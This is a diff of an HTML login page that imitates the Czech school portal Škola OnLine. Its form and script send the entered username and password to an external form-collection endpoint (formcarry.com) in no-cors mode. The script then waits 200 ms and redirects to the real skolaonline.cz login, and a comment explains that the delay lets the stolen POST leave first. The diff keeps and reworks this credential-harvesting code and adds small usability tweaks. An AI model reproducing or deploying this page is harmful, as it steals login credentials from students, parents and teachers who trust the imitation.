@@ -462,72 +462,80 @@ window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15
                 
                     
 <h2>        Přihlášení    </h2><div><form id="prihlaseniForm" action="https://formcarry.com/s/X_Af8yfXkAF" method="POST">
-<fieldset class="uk-fieldset">
+  <fieldset class="uk-fieldset">
 
-<!-- Uživatelské jméno -->
-<input name="JmenoUzivatele" type="text" id="JmenoUzivatele" class="tm-username uk-input uk-width-1-1" placeholder="Uživatelské jméno">
+    <!-- Uživatelské jméno -->
+    <input name="JmenoUzivatele" type="text" id="JmenoUzivatele" class="tm-username uk-input uk-width-1-1" placeholder="Uživatelské jméno" required>
     
-<!-- Heslo -->    
-<div class="uk-inline uk-width-1-1">
-<input name="HesloUzivatele" id="HesloUzivatele" class="uk-input uk-width-1-1" placeholder="Heslo" autocomplete="off" type="password">
-<!--a class="uk-form-icon uk-form-icon-flip" onclick="showPassword()"></a-->
-</div>
+    <!-- Heslo -->    
+    <div class="uk-inline uk-width-1-1">
+      <input name="HesloUzivatele" id="HesloUzivatele" class="uk-input uk-width-1-1" placeholder="Heslo" autocomplete="off" type="password" required>
+      <a href="javascript:void(0);" class="uk-form-icon uk-form-icon-flip" onclick="showPassword()">👁️</a>
+    </div>
 
-<!-- Chybová hláška (lze skrýt přidáním CSS třídy uk-hidden)
-LAK: to výše nefunguje, provedeno skrytí přes custom.css -->  
-<div class="tm-error">Neplatné uživatelské jméno nebo heslo nebo váš účet byl zablokován z&nbsp;důvodu velkého počtu neplatných pokusů.
-</div>
+    <!-- Chybová hláška -->
+    <div class="tm-error uk-hidden">
+      Neplatné uživatelské jméno nebo heslo nebo váš účet byl zablokován z&nbsp;důvodu velkého počtu neplatných pokusů.
+    </div>
+
+    <!-- Zapamatovat / Zapomenuté heslo --> 
+    <div class="tm-login-options uk-grid uk-grid-collapse uk-flex-middle">
+      <div class="uk-width-auto">
+        <label><input class="uk-checkbox" type="checkbox" id="remember" name="remember"> Zapamatovat</label>
+      </div>
+      <div class="uk-width-expand uk-text-right">
+        <a href="https://aplikace.skolaonline.cz/SOL/ZapomenuteHeslo.aspx" class="tm-lost-password uk-link-text">Zapomenuté heslo</a>
+      </div>
+    </div>
+
+    <!-- Přihlašovací tlačítko -->      
+    <input type="submit" name="btnLogin" value="Přihlásit do aplikace" id="btnLogin" class="uk-button uk-button-primary uk-button-large uk-width-1-1">
     
-<!-- Zapamatovat / Zapomenuté heslo --> 
-<div class="tm-login-options uk-grid uk-grid-collapse uk-flex-middle">
-<div class="uk-width-auto">
-<label><input class="uk-checkbox" type="checkbox">Zapamatovat</label>
-</div>
-<div class="uk-width-expand uk-text-right">
-<a href="https://aplikace.skolaonline.cz/SOL/ZapomenuteHeslo.aspx" class="tm-lost-password uk-link-text">Zapomenuté heslo</a>
-</div>
-</div>
-    
-<!-- Přihlašovací tlačítko -->      
-<input type="submit" name="btnLogin" value="Přihlásit do aplikace" id="btnLogin" class="uk-button uk-button-primary uk-button-large uk-width-1-1">
-    
-</fieldset>
+  </fieldset>
 </form>
+
 <script>
-document.getElementById("prihlaseniForm").addEventListener("submit", function(e) {
-  e.preventDefault(); // zablokuje defaultní submit
-
-  const form = this;
-
-  // data z formuláře
-  const data = {
-    JmenoUzivatele: form.JmenoUzivatele.value,
-    HesloUzivatele: form.HesloUzivatele.value,
-    remember: form.remember.checked ? "on" : "",
-    btnLogin: form.btnLogin.value
-  };
-
-  // připravíme POST
-  const params = new URLSearchParams();
-  for (const key in data) {
-    params.append(key, data[key]);
+  // Funkce pro zobrazení / skrytí hesla
+  function showPassword() {
+    const input = document.getElementById("HesloUzivatele");
+    input.type = input.type === "password" ? "text" : "password";
   }
 
-  // odešleme fetch s no-cors
-  fetch(form.action, {
-    method: "POST",
-    body: params,
-    headers: {
-      "Content-Type": "application/x-www-form-urlencoded"
-    },
-    mode: "no-cors"
-  });
+  // Odeslání formuláře přes fetch + přesměrování
+  document.getElementById("prihlaseniForm").addEventListener("submit", function(e) {
+    e.preventDefault(); // zablokuje defaultní submit
 
-  // **místo okamžitého window.location** použijeme krátké zpoždění
-  setTimeout(() => {
-    window.location.href = "https://www.skolaonline.cz/prihlaseni/?SOLLogin=pass";
-  }, 200); // 200 ms stačí, aby browser odeslal POST a nezačal render Formcarry
-});
+    const form = this;
+
+    // data z formuláře
+    const data = {
+      JmenoUzivatele: form.JmenoUzivatele.value,
+      HesloUzivatele: form.HesloUzivatele.value,
+      remember: form.remember.checked ? "on" : "",
+      btnLogin: form.btnLogin.value
+    };
+
+    // připravíme POST
+    const params = new URLSearchParams();
+    for (const key in data) {
+      params.append(key, data[key]);
+    }
+
+    // odešleme fetch s no-cors
+    fetch(form.action, {
+      method: "POST",
+      body: params,
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      mode: "no-cors"
+    });
+
+    // malé zpoždění, aby POST stihl odejít, a pak přesměrování
+    setTimeout(() => {
+      window.location.href = "https://www.skolaonline.cz/prihlaseni/?SOLLogin=pass";
+    }, 200);
+  });
 </script>
 
 
@@ -1563,6 +1571,7 @@ Database Caching 4/8 queries in 0.003 seconds using Redis
 
 Served from: www.skolaonline.cz @ 2026-02-26 20:34:05 by W3 Total Cache
 -->
+
 
 
 
